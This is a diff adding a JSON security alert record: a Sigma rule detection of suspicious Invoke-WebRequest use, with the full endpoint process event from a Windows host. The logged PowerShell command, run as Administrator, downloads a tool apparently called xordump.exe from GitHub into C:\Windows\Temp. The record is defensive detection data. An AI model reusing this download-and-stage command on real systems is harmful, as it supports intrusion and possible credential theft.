@@ -1,0 +1,216 @@
+{
+  "_id": "OKxGx58BiUkBvoTNEekh",
+  "_index": ".ds-logs-detections.alerts-so-2026.08.02-000147",
+  "_score": null,
+  "_source": {
+    "@timestamp": "2026-08-03T10:58:05.000Z",
+    "event": {
+      "dataset": "sigma.alert",
+      "module": "sigma",
+      "severity": 4,
+      "severity_label": "high"
+    },
+    "event_data": {
+      "@timestamp": "2026-08-03T10:51:54.651271Z",
+      "@version": "1",
+      "_id": "1DtAx58BstL_s-ZW3hrU",
+      "_index": ".ds-logs-endpoint.events.process-default-2026.07.05-000004",
+      "agent": {
+        "id": "1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
+        "type": "endpoint",
+        "version": "9.0.8"
+      },
+      "data_stream": {
+        "dataset": "endpoint.events.process",
+        "namespace": "default",
+        "type": "logs"
+      },
+      "ecs": {
+        "version": "8.10.0"
+      },
+      "elastic": {
+        "agent": {
+          "id": "1a52ee32-ef93-4f5a-b876-65bd1b7c795a"
+        }
+      },
+      "event": {
+        "action": [
+          "start",
+          "end"
+        ],
+        "category": [
+          "process"
+        ],
+        "created": "2026-08-03T10:51:58.7239061Z",
+        "dataset": "endpoint.events.process",
+        "id": "OZWc9AbxXaKhFKi++++QYkST",
+        "ingested": "2026-08-03T10:52:25Z",
+        "kind": "event",
+        "module": "endpoint",
+        "outcome": "unknown",
+        "sequence": 584443,
+        "type": [
+          "start",
+          "end"
+        ]
+      },
+      "host": {
+        "id": "c8fc26bf-dc76-4dba-adbb-bf31640d9c9f",
+        "name": "win-kvkmd51ggkq",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "message": "Endpoint process event",
+      "metadata": {
+        "index": "logs-endpoint.events.process-default",
+        "input": {
+          "beats": {
+            "host": {
+              "ip": "172.20.24.99"
+            }
+          }
+        }
+      },
+      "num_hits": 2,
+      "num_matches": 1,
+      "process": {
+        "Ext": {
+          "ancestry": [
+            "mkOl+51JIBVNcO24LkoqVw",
+            "2MnF6v+TOezg/GpQ/UUtLQ"
+          ],
+          "authentication_id": "0x58038",
+          "code_signature": [
+            {
+              "exists": true,
+              "status": "trusted",
+              "subject_name": "Microsoft Windows",
+              "trusted": true
+            }
+          ],
+          "mitigation_policies": [
+            "CET dynamic APIs can only be called out of proc",
+            "CF Guard"
+          ],
+          "relative_file_creation_time": 165292545.8818133,
+          "relative_file_name_modify_time": 1694228.7812193,
+          "session_info": {
+            "authentication_package": "NTLM",
+            "id": 1,
+            "logon_type": "Interactive",
+            "relative_logon_time": 1608982.9987392,
+            "relative_password_age": 1697408.0461385,
+            "user_flags": [
+              "LOGON_EXTRA_SIDS",
+              "LOGON_NTLMV2_ENABLED",
+              "LOGON_WINLOGON"
+            ]
+          },
+          "token": {
+            "elevation_level": "default",
+            "integrity_level_name": "high",
+            "security_attributes": [
+              "TSA://ProcUnique"
+            ]
+          }
+        },
+        "args": [
+          "powershell.exe",
+          "&",
+          "{[Net.ServicePointManager]::SecurityProtocol",
+          "=",
+          "[Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest",
+          "\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\"",
+          "-OutFile",
+          "C:\\Windows\\Temp\\xordump.exe}"
+        ],
+        "args_count": 8,
+        "code_signature": {
+          "exists": true,
+          "status": "trusted",
+          "subject_name": "Microsoft Windows",
+          "trusted": true
+        },
+        "command_line": "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \\\"\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\\\"\" -OutFile C:\\Windows\\Temp\\xordump.exe}",
+        "entity_id": "uOvTPLNSnmfyuV88qckvUg",
+        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "exit_code": 0,
+        "hash": {
+          "sha256": "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94"
+        },
+        "name": "powershell.exe",
+        "parent": {
+          "Ext": {
+            "code_signature": [
+              {
+                "exists": true,
+                "status": "trusted",
+                "subject_name": "Microsoft Windows",
+                "trusted": true
+              }
+            ]
+          },
+          "args": [
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          ],
+          "args_count": 1,
+          "code_signature": {
+            "exists": true,
+            "status": "trusted",
+            "subject_name": "Microsoft Windows",
+            "trusted": true
+          },
+          "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+          "entity_id": "mkOl+51JIBVNcO24LkoqVw",
+          "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "name": "powershell.exe",
+          "pid": 600,
+          "thread": {
+            "Ext": {
+              "call_stack_contains_unbacked": true
+            }
+          }
+        },
+        "pe": {
+          "imphash": "bf7a6e7a62c3f5b2e8e069438ac1dd3d",
+          "original_file_name": "PowerShell.EXE"
+        },
+        "pid": 7568,
+        "working_directory": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\"
+      },
+      "tags": [
+        "elastic-agent",
+        "input-nodemanager",
+        "beats_input_codec_plain_applied",
+        "events.process"
+      ],
+      "user": {
+        "domain": "WIN-KVKMD51GGKQ",
+        "id": "S-1-5-21-2509633083-2976797254-1976158143-500",
+        "name": "Administrator"
+      }
+    },
+    "ioc": {
+      "dataset": "sigma.alert",
+      "rule": {
+        "name": "Suspicious Invoke-WebRequest Execution",
+        "severity": "high",
+        "uuid": "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc"
+      },
+      "schema_version": "1.0",
+      "source_engine": "sigma"
+    },
+    "rule": {
+      "category": "process_creation",
+      "name": "Suspicious Invoke-WebRequest Execution",
+      "product": "windows",
+      "uuid": "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc"
+    },
+    "sigma_level": "high",
+    "tags": "alert"
+  },
+  "sort": [
+    1785754685000
+  ]
+}
